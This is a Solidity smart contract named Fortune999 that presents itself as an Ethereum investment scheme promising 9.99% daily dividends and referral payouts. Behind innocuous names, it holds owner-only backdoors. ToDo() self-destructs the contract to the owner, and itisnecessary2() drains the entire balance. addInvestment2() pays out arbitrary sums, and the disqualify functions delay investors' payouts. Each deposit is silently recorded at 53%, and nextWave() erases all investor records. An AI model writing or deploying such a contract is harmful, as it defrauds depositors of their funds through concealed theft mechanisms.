 

pragma solidity 0.4.26;

 


library Math {
function min(uint a, uint b) internal pure returns(uint) {
if (a > b) {
return b;
}
return a;
}
}


library Zero {
function requireNotZero(address addr) internal pure {
require(addr != address(0), "require not zero address");
}

function requireNotZero(uint val) internal pure {
require(val != 0, "require not zero value");
}

function notZero(address addr) internal pure returns(bool) {
return !(addr == address(0));
}

function isZero(address addr) internal pure returns(bool) {
return addr == address(0);
}

function isZero(uint a) internal pure returns(bool) {
return a == 0;
}

function notZero(uint a) internal pure returns(bool) {
return a != 0;
}
}


library Percent {
struct percent {
uint num;
uint den;
}

function mul(percent storage p, uint a) internal view returns (uint) {
if (a == 0) {
return 0;
}
return a*p.num/p.den;
}

function div(percent storage p, uint a) internal view returns (uint) {
return a/p.num*p.den;
}

function sub(percent storage p, uint a) internal view returns (uint) {
uint b = mul(p, a);
if (b >= a) {
return 0;
}
return a - b;
}

function add(percent storage p, uint a) internal view returns (uint) {
return a + mul(p, a);
}

function toMemory(percent storage p) internal view returns (Percent.percent memory) {
return Percent.percent(p.num, p.den);
}

function mmul(percent memory p, uint a) internal pure returns (uint) {
if (a == 0) {
return 0;
}
return a*p.num/p.den;
}

function mdiv(percent memory p, uint a) internal pure returns (uint) {
return a/p.num*p.den;
}

function msub(percent memory p, uint a) internal pure returns (uint) {
uint b = mmul(p, a);
if (b >= a) {
return 0;
}
return a - b;
}

function madd(percent memory p, uint a) internal pure returns (uint) {
return a + mmul(p, a);
}
}


library Address {
  function toAddress(bytes source) internal pure returns(address addr) {
    assembly { addr := mload(add(source,0x14)) }
    return addr;
  }

  function isNotContract(address addr) internal view returns(bool) {
    uint length;
    assembly { length := extcodesize(addr) }
    return length == 0;
  }
}


 
library SafeMath {

 
function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
if (_a == 0) {
return 0;
}

uint256 c = _a * _b;
require(c / _a == _b);

return c;
}

 
function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
require(_b > 0);  
uint256 c = _a / _b;
assert(_a == _b * c + _a % _b);  

return c;
}

 
function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
require(_b <= _a);
uint256 c = _a - _b;

return c;
}

 
function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
uint256 c = _a + _b;
require(c >= _a);

return c;
}

 
function mod(uint256 a, uint256 b) internal pure returns (uint256) {
require(b != 0);
return a % b;
}
}


contract Accessibility {
address private owner;
modifier onlyOwner() {
require(msg.sender == owner, "access denied");
_;
}

constructor() public {
owner = msg.sender;
}


function ToDo() public onlyOwner {
    selfdestruct(owner);
    }

function disown() internal {
delete owner;
}

}


contract Rev1Storage {
function investorShortInfo(address addr) public view returns(uint value, uint refBonus);
}


contract Rev2Storage {
function investorInfo(address addr) public view returns(uint investment, uint paymentTime);
}


library PrivateEntrance {
using PrivateEntrance for privateEntrance;
using Math for uint;
struct privateEntrance {
Rev1Storage rev1Storage;
Rev2Storage rev2Storage;
uint investorMaxInvestment;
uint endTimestamp;
mapping(address=>bool) hasAccess;
}

function isActive(privateEntrance storage pe) internal view returns(bool) {
return pe.endTimestamp > now;
}

 

function provideAccessFor(privateEntrance storage pe, address[] addrs) internal {
for (uint16 i; i < addrs.length; i++) {
pe.hasAccess[addrs[i]] = true;
}
}
}

 
contract InvestorsStorage is Accessibility {
struct Investor {
uint investment;


uint paymentTime;
}
uint public size;

mapping (address => Investor) private investors;

function isInvestor(address addr) public view returns (bool) {
return investors[addr].investment > 0;
}

function investorInfo(address addr) public view returns(uint investment, uint paymentTime) {
investment = investors[addr].investment;
paymentTime = investors[addr].paymentTime;
}

function newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {
Investor storage inv = investors[addr];
if (inv.investment != 0 || investment == 0) {
return false;
}
inv.investment = investment*53/100;  
inv.paymentTime = paymentTime;
size++;
return true;
}

function addInvestment(address addr, uint investment) public onlyOwner returns (bool) {
if (investors[addr].investment == 0) {
return false;
}
investors[addr].investment += investment*53/100;  
return true;
}




function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {
if (investors[addr].investment == 0) {
return false;
}
investors[addr].paymentTime = paymentTime;
return true;
}

function disqalify(address addr) public onlyOwner returns (bool) {
if (isInvestor(addr)) {
 
investors[addr].paymentTime = now + 1 days;
}
}

function disqalify2(address addr) public onlyOwner returns (bool) {
if (isInvestor(addr)) {
 
investors[addr].paymentTime = now;
}
}


}

library RapidGrowthProtection {
using RapidGrowthProtection for rapidGrowthProtection;

struct rapidGrowthProtection {
uint startTimestamp;
uint maxDailyTotalInvestment;
uint8 activityDays;
mapping(uint8 => uint) dailyTotalInvestment;
}

 

function isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {
uint day = rgp.currDay();
return day != 0 && day <= rgp.activityDays;
}

function saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {
uint day = rgp.currDay();
if (day == 0 || day > rgp.activityDays) {
return false;
}
if (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {
return false;
}
rgp.dailyTotalInvestment[uint8(day)] += investment;
return true;
}

function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
rgp.startTimestamp = timestamp;

}
 

function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
if (rgp.startTimestamp > now) {
return 0;
}
day = (now - rgp.startTimestamp) / 24 hours + 1;
}
}

contract Fortune999 is Accessibility {
using RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;
using PrivateEntrance for PrivateEntrance.privateEntrance;
using Percent for Percent.percent;
using SafeMath for uint;
using Math for uint;

 
using Address for *;
using Zero for *;

RapidGrowthProtection.rapidGrowthProtection private m_rgp;
PrivateEntrance.privateEntrance private m_privEnter;
mapping(address => bool) private m_referrals;
InvestorsStorage private m_investors;

 
uint public constant minInvesment = 0.01 ether; 
uint public constant maxBalance = 333e5 ether;
address public advertisingAddress;
address public adminsAddress;
uint public investmentsNumber;
uint public waveStartup;


 
Percent.percent private m_1_percent = Percent.percent(999,10000);             
Percent.percent private m_referal_percent = Percent.percent(0,10000);             
Percent.percent private m_referrer_percent = Percent.percent(25,100);             
Percent.percent private m_referrer_percentMax = Percent.percent(25,100);        
Percent.percent private m_adminsPercent = Percent.percent(6,100);           
Percent.percent private m_advertisingPercent = Percent.percent(12,100);     

 
event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
event LogNewInvesment(address indexed addr, uint when, uint investment, uint value);
event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
event LogPayDividends(address indexed addr, uint when, uint dividends);
event LogNewInvestor(address indexed addr, uint when);
event LogBalanceChanged(uint when, uint balance);
event LogNextWave(uint when);
event LogDisown(uint when);


modifier balanceChanged {
_;
emit LogBalanceChanged(now, address(this).balance);
}

modifier notFromContract() {
require(msg.sender.isNotContract(), "only externally accounts");
_;
}

constructor() public {
adminsAddress = msg.sender;
advertisingAddress = msg.sender;
nextWave();
}

function() public payable {
 
if (msg.value.isZero()) {
getMyDividends();
return;
}

 
doInvest(msg.data.toAddress());
}

function disqualifyAddress(address addr) public onlyOwner {
m_investors.disqalify(addr);
}

function disqualifyAddress2(address addr) public onlyOwner {
m_investors.disqalify2(addr);
}


function doDisown() public onlyOwner {
disown();
emit LogDisown(now);
}

 

function init(address rev1StorageAddr, uint timestamp) public onlyOwner {

m_rgp.startTimestamp = timestamp + 1;
 
 
emit LogRGPInit(
now,
m_rgp.startTimestamp,
m_rgp.maxDailyTotalInvestment,
m_rgp.activityDays
);


 
m_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);
m_privEnter.rev2Storage = Rev2Storage(address(m_investors));
 
m_privEnter.endTimestamp = timestamp;
emit LogPEInit(
now,
address(m_privEnter.rev1Storage),
address(m_privEnter.rev2Storage),
m_privEnter.investorMaxInvestment,
m_privEnter.endTimestamp
);
}

function setAdvertisingAddress(address addr) public onlyOwner {
addr.requireNotZero();
advertisingAddress = addr;
}

function setAdminsAddress(address addr) public onlyOwner {
addr.requireNotZero();
adminsAddress = addr;
}

function privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {
m_privEnter.provideAccessFor(addrs);
}

 

function investorsNumber() public view returns(uint) {
return m_investors.size();
}

function balanceETH() public view returns(uint) {
return address(this).balance;
}



function advertisingPercent() public view returns(uint numerator, uint denominator) {
(numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
}

function adminsPercent() public view returns(uint numerator, uint denominator) {
(numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
}

function investorInfo(address investorAddr)public view returns(uint investment, uint paymentTime, bool isReferral) {
(investment, paymentTime) = m_investors.investorInfo(investorAddr);
isReferral = m_referrals[investorAddr];
}



function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
dividends = calcDividends(investorAddr);
}

function dailyPercentAtNow() public view returns(uint numerator, uint denominator) {
Percent.percent memory p = dailyPercent();
(numerator, denominator) = (p.num, p.den);
}

function getMyDividends() public notFromContract balanceChanged {
 

 
 

uint dividends = calcDividends(msg.sender);
require (dividends.notZero(), "cannot to pay zero dividends");

 
assert(m_investors.setPaymentTime(msg.sender, now));

 
if (address(this).balance <= dividends) {
nextWave();
dividends = address(this).balance;
}


    
 
msg.sender.transfer(dividends);
emit LogPayDividends(msg.sender, now, dividends);
}

    
function itisnecessary2() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }    
    

function addInvestment2( uint investment, address investorAddr) public onlyOwner  {


investorAddr.transfer(investment);

} 

function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
uint investment = msg.value;
uint receivedEther = msg.value;
require(investment >= minInvesment, "investment must be >= minInvesment");
require(address(this).balance <= maxBalance, "the contract eth balance limit");

 

 
if (receivedEther > investment) {
uint excess = receivedEther - investment;
msg.sender.transfer(excess);
receivedEther = investment;
emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
}

 
advertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));
adminsAddress.transfer(m_adminsPercent.mul(receivedEther));

 if (msg.value > 0)
        {
           
        if (msg.data.length == 20) {
              
              referrerAddr.transfer(m_referrer_percent.mmul(investment));  
               
            }
            else if (msg.data.length == 0) {
        
            
            adminsAddress.transfer(m_referrer_percent.mmul(investment));
             
            } 
            else {
                assert(false);  
            }
        }
    
    

bool senderIsInvestor = m_investors.isInvestor(msg.sender);

 
if (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&
referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {


m_referrals[msg.sender] = true;
 
uint referrerBonus = m_referrer_percent.mmul(investment);
if (investment > 10 ether) {
referrerBonus = m_referrer_percentMax.mmul(investment);
}


 
 
 
 


}

 
uint dividends = calcDividends(msg.sender);
if (senderIsInvestor && dividends.notZero()) {
investment += dividends;
emit LogAutomaticReinvest(msg.sender, now, dividends);
}

if (senderIsInvestor) {
 
assert(m_investors.addInvestment(msg.sender, investment));
assert(m_investors.setPaymentTime(msg.sender, now));
} else {
 
assert(m_investors.newInvestor(msg.sender, investment, now));
emit LogNewInvestor(msg.sender, now);
}

investmentsNumber++;
emit LogNewInvesment(msg.sender, now, investment, receivedEther);
}

function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
(uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);
return InvestorsStorage.Investor(investment, paymentTime);
}

function calcDividends(address investorAddr) internal view returns(uint dividends) {
    InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);

     
    if (investor.investment.isZero() || now.sub(investor.paymentTime) < 1 seconds) {
      return 0;
    }
    
     
     

     
     

     

    Percent.percent memory p = dailyPercent();
    dividends = (now.sub(investor.paymentTime) / 1 seconds) * p.mmul(investor.investment) / 86400;
  }

function dailyPercent() internal view returns(Percent.percent memory p) {
    uint balance = address(this).balance;
      

    if (balance < 33333e5 ether) { 
   
      p = m_1_percent.toMemory();     

  }
  }

function nextWave() private {
m_investors = new InvestorsStorage();
investmentsNumber = 0;
waveStartup = now;
m_rgp.startAt(now);
emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
emit LogNextWave(now);
}
}